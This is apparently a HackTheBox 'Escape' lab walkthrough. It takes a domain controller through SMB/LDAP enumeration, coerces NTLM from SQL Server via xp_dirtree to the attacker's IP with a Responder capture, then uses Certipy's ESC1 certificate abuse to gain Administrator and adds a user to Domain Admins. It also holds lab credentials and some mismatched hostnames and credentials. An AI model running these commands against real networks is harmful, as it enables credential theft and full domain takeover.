# Escape (HackTheBox) — Active Directory Certificate Services (AD CS) Exploitation via ESC1

A practical walkthrough of HTB's Escape box, focusing on AD Certificate Services enumeration, certificate template exploitation, NTLM hash capture via SQL Server, and privilege escalation through certificate-based authentication.

---

## Reconnaissance

### Network Scanning

**Command:**
```bash
sudo nmap -sV -sC -O -T4 10.129.3.121
```

**Output:**
```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-09 07:47 -0400
Nmap scan report for 10.129.3.121
Host is up (0.035s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-09 19:47:06Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2026-03-09T19:48:31+00:00; +7h59m11s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-03-09T19:48:30+00:00; +7h59m11s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.3.121:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2026-03-09T19:48:31+00:00; +7h59m11s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.3.121:1433: 
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-03-09T19:40:04
|_Not valid after:  2056-03-09T19:40:04
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-03-09T19:48:31+00:00; +7h59m11s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2026-03-09T19:48:30+00:00; +7h59m11s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-03-09T19:47:51
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h59m10s, deviation: 0s, median: 7h59m10s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.65 seconds
```

**Key Findings:**
- Domain: `sequel.htb`
- DC: `dc.sequel.htb`
- SQL Server 2019 running on port 1433
- LDAP/LDAPS on ports 389, 636, 3268, 3269
- WinRM on port 5985
- SMB signing enabled and required
- OS: Windows Server 2019

---

## Initial Enumeration

### SMB Anonymous Access

**Command:**
```bash
nxc smb 10.129.3.121 -u anonymous -p ""
```

**Output:**
```
SMB         10.129.3.121    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.3.121    445    DC               [+] sequel.htb\anonymous: (Guest)
```

### SMB Share Enumeration

**Command:**
```bash
nxc smb 10.129.3.121 -u anonymous -p "" --shares
```

**Output:**
```
SMB         10.129.3.121    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.3.121    445    DC               [+] sequel.htb\anonymous: (Guest)
SMB         10.129.3.121    445    DC               [*] Enumerated shares
SMB         10.129.3.121    445    DC               Share           Permissions     Remark
SMB         10.129.3.121    445    DC               -----           -----------     ------
SMB         10.129.3.121    445    DC               ADMIN$                          Remote Admin
SMB         10.129.3.121    445    DC               C$                              Default share
SMB         10.129.3.121    445    DC               IPC$            READ            Remote IPC
SMB         10.129.3.121    445    DC               NETLOGON                        Logon server share 
SMB         10.129.3.121    445    DC               Public          READ            
SMB         10.129.3.121    445    DC               SYSVOL                          Logon server share 
```

**Notable Shares:** `Public` (readable), `IPC$` (readable)

### SMB Share Content Enumeration with spider_plus

**Command:**
```bash
nxc smb 10.129.3.121 -u anonymous -p "" --shares Public -M spider_plus
```

**Output:**
```
SMB         10.129.3.121    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.3.121    445    DC               [+] sequel.htb\anonymous: (Guest)
SPIDER_PLUS 10.129.3.121    445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.3.121    445    DC               [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.3.121    445    DC               [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.3.121    445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.3.121    445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.3.121    445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.3.121    445    DC               [*]  OUTPUT_FOLDER: /Users/jbrown/.nxc/modules/nxc_spider_plus
SMB         10.129.3.121    445    DC               [*] Enumerated shares
SMB         10.129.3.121    445    DC               Share           Permissions     Remark
SMB         10.129.3.121    445    DC               -----           -----------     ------
SPIDER_PLUS 10.129.3.121    445    DC               [+] Saved share-file metadata to "/Users/jbrown/.nxc/modules/nxc_spider_plus/10.129.3.121.json".
SPIDER_PLUS 10.129.3.121    445    DC               [*] SMB Shares:           6 (ADMIN$, C$, IPC$, NETLOGON, Public, SYSVOL)
SPIDER_PLUS 10.129.3.121    445    DC               [*] SMB Readable Shares:  2 (IPC$, Public)
SPIDER_PLUS 10.129.3.121    445    DC               [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.129.3.121    445    DC               [*] Total folders found:  0
SPIDER_PLUS 10.129.3.121    445    DC               [*] Total files found:    1
SPIDER_PLUS 10.129.3.121    445    DC               [*] File size average:    48.39 KB
SPIDER_PLUS 10.129.3.121    445    DC               [*] File size min:        48.39 KB
SPIDER_PLUS 10.129.3.121    445    DC               [*] File size max:        48.39 KB
```

**Note:** nxc spider_plus module failed to retrieve file details. Using smbclient instead.

### Manual SMB Content Retrieval

**Command:**
```bash
python3 smbclient.py sequel.htb\anonymous@10.129.3.121
```

**Session Output:**
```
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies 

Password:
Type help for list of commands
# use public
# ls
drw-rw-rw-          0  Sat Nov 19 06:51:25 2022 .
drw-rw-rw-          0  Sat Nov 19 06:51:25 2022 ..
-rw-rw-rw-      49551  Sat Nov 19 06:51:25 2022 SQL Server Procedures.pdf
# get SQL Server Procedures.pdf
```

**File Retrieved:** `SQL Server Procedures.pdf` (49,551 bytes)

---

## LDAP Enumeration

### Anonymous LDAP Bind

**Command:**
```bash
./windapsearch.py -d sequel.htb --dc-ip 10.129.3.121
```

**Output:**
```
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.129.3.121
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=sequel,DC=htb
[+] Attempting bind
[+]	...success! Binded as: 
[+]	 None

[*] Bye!
```

**Result:** Anonymous bind successful. Domain context: `DC=sequel,DC=htb`

### User Enumeration Results

**Key Users Found:**
- Guest (Built-in, password not required)
- Administrator (member of Domain Admins, Enterprise Admins, Schema Admins)
- Ryan.Cooper (discovered through later enumeration)

**Guest User Details:**
```
objectClass                : top, person, organizationalPerson, user
cn                         : Guest
description                : Built-in account for guest access to the computer/domain
distinguishedName          : CN=Guest,CN=Users,DC=sequel,DC=htb
memberOf                   : CN=Guests,CN=Builtin,DC=sequel,DC=htb
name                       : Guest
objectGUID                 : {4caf36d0-3eb1-4794-b4df-bcdf853f73dc}
userAccountControl         : PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
badPwdCount                : 0
badPasswordTime            : [REDACTED] 00:00:00 (425 years, 2 months ago)
lastLogoff                 : 1601-01-01 00:00:00+00:00
lastLogon                  : 01/01/1601 00:00:00 (425 years, 2 months ago)
pwdLastSet                 : 01/01/1601 00:00:00 (425 years, 2 months ago)
primaryGroupID             : 514
objectSid                  : S-1-5-21-4078382237-1492182817-2568127209-501
sAMAccountName             : Guest
sAMAccountType             : SAM_USER_OBJECT
objectCategory             : CN=Person,CN=Schema,CN=Configuration,DC=sequel,DC=htb
lastLogonTimestamp         : 11/03/2026 07:05:34 (today)
vulnerabilities            : [VULN-002] User account with password that never expires (LOW)
                             [VULN-003] User account with password not required (HIGH)
```

**Administrator User Details:**
```
objectClass                : top, person, organizationalPerson, user
cn                         : Administrator
description                : Built-in account for administering the computer/domain
distinguishedName          : CN=Administrator,CN=Users,DC=sequel,DC=htb
memberOf                   : CN=Group Policy Creator Owners,CN=Users,DC=sequel,DC=htb
                             CN=Domain Admins,CN=Users,DC=sequel,DC=htb
                             CN=Enterprise Admins,CN=Users,DC=sequel,DC=htb
                             CN=Schema Admins,CN=Users,DC=sequel,DC=htb
                             CN=Administrators,CN=Builtin,DC=sequel,DC=htb
name                       : Administrator
objectGUID                 : {6a0a4db3-1a97-45b1-ac9c-e52f0d543e4f}
userAccountControl         : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, NOT_DELEGATED
badPwdCount                : 0
badPasswordTime            : [REDACTED] 23:19:44 (2 years, 1 month ago)
lastLogoff                 : 1601-01-01 00:00:00+00:00
lastLogon                  : 10/03/2026 20:22:49 (today)
pwdLastSet                 : 18/11/2022 21:13:16 (3 years, 3 months ago)
primaryGroupID             : 513
objectSid                  : S-1-5-21-4078382237-1492182817-2568127209-500
adminCount                 : 1
sAMAccountName             : Administrator
sAMAccountType             : SAM_USER_OBJECT
objectCategory             : CN=Person,CN=Schema,CN=Configuration,DC=sequel,DC=htb
lastLogonTimestamp         : 10/03/2026 20:22:24 (today)
vulnerabilities            : [VULN-002] User account with password that never expires (LOW)
```

---

## SQL Server Exploitation

### NTLM Hash Capture via SQL Server xp_dirtree

SQL Server has extended stored procedures that can trigger authentication to remote shares, forcing NTLM hash transmission.

**Reference Commands:**

List databases:
```sql
SELECT name FROM sys.databases;
```

Check database permissions:
```sql
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
```

**Registry Query Method:**
```sql
DECLARE @ServiceAccount VARCHAR(100);
EXECUTE xp_instance_regread 
    @rootkey = N'HKEY_LOCAL_MACHINE', 
    @key = N'SYSTEM\CurrentControlSet\Services\MSSQLServer', 
    @value_name = N'ObjectName', 
    @value = @ServiceAccount OUTPUT;
SELECT @ServiceAccount AS MSSQL_Service_Account;
```

**NTLM Hash Capture via xp_dirtree (Most Common):**
```sql
EXEC master..xp_dirtree '\\<YOUR_IP>\<SHARE_NAME>\', 1, 1;
```

### NTLM Relay Attack Setup

**Tools Required:**
- Responder: https://github.com/lgandx/Responder.git
- Hashcat: Mode 5600 (Net-NTLMv2)

**Responder Command:**
```bash
sudo python3 Responder.py -I tun0 -i 10.10.14.49 -v
```

**SQL Trigger Command:**
```sql
EXEC master..xp_dirtree '\\10.10.14.49\escape\', 1, 1;
```

**Hash Cracking:**
```bash
hashcat -m 5600 hash.txt rockyou.txt
```

**Output:**
```
hashcat (v7.1.2-382-g2d71af371) starting

METAL API (Metal 368.52)
========================
* Device #01: Apple M2, skipped

OpenCL API (OpenCL 1.2 (Jul 20 2025 19:29:12)) - Platform #1 [Apple]
====================================================================
* Device #02: Apple M2, GPU, 2730/5461 MB (512 MB allocatable), 10MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt
```

---

## Active Directory Certificate Services (AD CS) Enumeration

### Certipy Installation

```bash
sudo apt update && sudo apt install -y python3 python3-pip
python3 -m venv certipy-venv
source certipy-venv/bin/activate
pip install certipy-ad
```

This ensures Certipy's dependencies don't conflict with system Python packages.

### Certificate Template Enumeration

**Command:**
```bash
certipy find \
    -u 'Ryan.Cooper@sequel.local' -p 'NuclearMosquito3' \
    -dc-ip '10.129.4.42' -text \
    -enabled -hide-admins
```

### Vulnerability Analysis: ESC1 (Enrollee Supplies Subject)

**Key Findings:**
- User Enrollable Principals: `SEQUEL.HTB\Domain Users` — Any user can request a certificate
- `Enrollee Supplies Subject: True` — The CA trusts whatever identity is placed in the Subject Alternative Name (SAN) field
- Certificate Name Flag: `EnrolleeSuppliesSubject`

**Exploit Mechanism:**
This misconfiguration allows an authenticated user to request a certificate for ANY user (including Administrator) because:
1. The template allows domain users to enroll
2. The template allows the enrollee to supply the subject name
3. The CA blindly trusts the SAN field without validation

---

## Privilege Escalation via Certificate Exploitation

### Request Administrator Certificate as Ryan.Cooper

**Command (First Attempt):**
```bash
certipy req \
    -u 'Ryan.Cooper@sequel.local' -p 'NuclearMosquito3' \
    -dc-ip '10.129.4.42' -target 'sequel.htb' \
    -ca 'sequel-DC-CA' -template 'UserAuthentication' \
    -upn 'Administrator@sequel.htb' -sid 'S-1-5-21-4078382237-1492182817-2568127209-500'
```

**Output:**
```
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 15
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@sequel.htb'
[*] Certificate object SID is 'S-1-5-21-4078382237-1492182817-2568127209-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

**Result:** Certificate successfully requested as Administrator.

### Certificate Authentication

**Command (Certificate to TGT via Kerberos):**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.129.4.42'
```

**Issue Encountered:** Clock skew error due to time desynchronization.

**Error:**
```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

### LDAPS Shell Authentication (Bypass Clock Skew)

**Command:**
```bash
certipy auth -pfx administrator.pfx -dc-ip 10.129.4.42 -ldap-shell
```

**Output:**
```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Connecting to 'ldaps://10.129.4.42:636'
[*] Authenticated to '10.129.4.42' as: u:sequel\Administrator
Type help for list of commands

# whoami
u:sequel\Administrator
```

**Result:** Successfully authenticated as Administrator via LDAPS.

### LDAPS Shell Commands Available

**Command Help Output:**
```
 add_computer computer [password] [nospns] - Adds a new computer to the domain with the specified password. If nospns is specified, computer will be created with only a single necessary HOST SPN. Requires LDAPS.
 rename_computer current_name new_name - Sets the SAMAccountName attribute on a computer object to a new value.
 add_user new_user [parent] - Creates a new user.
 add_user_to_group user group - Adds a user to a group.
 change_password user [password] - Attempt to change a given user's password. Requires LDAPS.
 clear_rbcd target - Clear the resource based constrained delegation configuration information.
 disable_account user - Disable the user's account.
 enable_account user - Enable the user's account.
 dump - Dumps the domain.
 search query [attributes,] - Search users and groups by name, distinguishedName and sAMAccountName.
 get_user_groups user - Retrieves all groups this user is a member of.
 get_group_users group - Retrieves all members of a group.
 get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
 grant_control [search_base] target grantee - Grant full control on a given target object (sAMAccountName or search filter, optional search base) to the grantee (sAMAccountName).
 set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
 set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
 start_tls - Send a StartTLS command to upgrade from LDAP to LDAPS. Use this to bypass channel binding for operations necessitating an encrypted channel.
 write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
 whoami - get connected user
 dirsync - Dirsync requested attributes
 exit - Terminates this session.
```

### Group Membership Modification (Post-Exploitation)

**Command:**
```
# add_user_to_group Ryan.Cooper "Domain Admins"
```

**Output:**
```
Adding user: Ryan.Cooper to group Domain Admins result: OK
```

**Result:** Ryan.Cooper successfully added to Domain Admins group.

---

## Alternative: WinRM Access via Evil-WinRM

### Extract Keys from PFX Certificate

**Extract Public Certificate:**
```bash
openssl pkcs12 -in administrator.pfx -clcerts -nokeys -out cert.pem
```

**Extract Private Key:**
```bash
openssl pkcs12 -in administrator.pfx -nocerts -nodes -out key.pem
```

### Connect via Evil-WinRM with Certificate Auth

**Command:**
```bash
evil-winrm -i 10.129.4.42 -c cert.pem -k key.pem -S
```

This provides an alternative to Certipy's LDAPS shell with more traditional WinRM functionality.

---

## Manual ACL & Group Enumeration

### PowerShell Script for Domain ACL Discovery

**PowerShell command to enumerate group permissions and identify write privileges:**
```powershell
$searcher = [ADSISearcher]"(objectCategory=group)"
$searcher.PageSize = 1000
$searcher.FindAll() | ForEach-Object {
    $dn = $_.Properties.distinguishedname
    Write-Host "`n--- Permissions for: $dn ---" -ForegroundColor Cyan
    # Run dsacls and filter for high-privilege rights
    dsacls "$dn" | Select-String "GW|WD|GA"
}
```

This script identifies groups with WriteDACL (WD), GenericWrite (GW), and GenericAll (GA) permissions.

### BloodHound Data Collection with netexec

**Collect AD data for BloodHound visualization:**
```bash
nxc ldap 10.129.3.121 -u svc-alfresco -p s3rvice -d sequel.htb --bloodhound --collection All --dns-server 10.129.3.121
```

**Note:** Update `/etc/hosts` with DNS resolution for BloodHound ingest to work correctly.

### BloodHound Cypher Queries for Attack Path Analysis

**List all groups in the domain:**
```cypher
MATCH (g:Group) RETURN g.name
MATCH (g:Group {domain: 'SEQUEL.HTB'}) RETURN g.name
```

**Find all members of a specific group (e.g., Domain Admins):**
```cypher
MATCH (u)-[:MemberOf*1..]->(g:Group {name: 'DOMAIN ADMINS@SEQUEL.HTB'}) RETURN u.name, u.type
```

**Find all groups a user is a member of:**
```cypher
MATCH (u:User {name: 'RYAN.COOPER@SEQUEL.HTB'})-[:MemberOf*1..]->(g:Group) RETURN g.name
```

**Find nested group memberships (Groups inside groups):**
```cypher
MATCH (g1:Group)-[:MemberOf*1..]->(g2:Group) RETURN g1.name, g2.name
```

**List groups with the most members (identify high-privilege targets):**
```cypher
MATCH (g:Group)<-[:MemberOf*1..]-(u:User) RETURN g.name, count(u) AS MemberCount ORDER BY MemberCount DESC
```

---

## PowerView.py Enumeration

Reference for programmatic AD enumeration using PowerView.py:

**Installation:**
```bash
git clone https://github.com/aniqfakhrul/powerview.py
```

**Key Commands:**
```powershell
whoami /all
Get-DomainUser
Get-DomainGroup
Get-DomainGroupMember "Domain Admins"
Get-DomainComputer
Find-InterestingDomainAcl
Find-LocalAdminAccess
Find-DomainShare
```

---

## Post-Exploitation Enumeration Modules

### NetExec (nxc) LDAP Modules

Targeted enumeration modules for deeper LDAP interrogation:

**AS-REP Roasting Detection:**
```bash
nxc ldap <DC_IP> -u 'user' -p 'pass' --asreproast
```

**Enumerate AD Certificate Services:**
```bash
nxc ldap <DC_IP> -u 'user' -p 'pass' -M adcs
```

**Find User Descriptions (Often Contain Passwords):**
```bash
nxc ldap <DC_IP> -u 'user' -p 'pass' -M get-desc-users
```

**Check Machine Account Quota (MAQ):**
```bash
nxc ldap <DC_IP> -u 'user' -p 'pass' -M maq
```

---

## Key Takeaways

1. **AD CS Enumeration** — Certipy finds vulnerable certificate templates by checking enrollment permissions and subject name policies
2. **ESC1 Exploitation** — Templates allowing enrollee-supplied subjects enable arbitrary certificate requests for high-privilege accounts
3. **NTLM Hash Capture** — SQL Server's xp_dirtree can force authentication to attacker-controlled shares
4. **Certificate-Based Auth** — Compromised certificates bypass Kerberos pre-authentication and provide domain admin access
5. **LDAPS Shell** — Certipy's LDAPS shell bypasses clock skew issues and provides direct domain object manipulation
6. **Post-Exploitation Options** — Both LDAPS shells and WinRM (via certificate extraction) provide admin access post-compromise
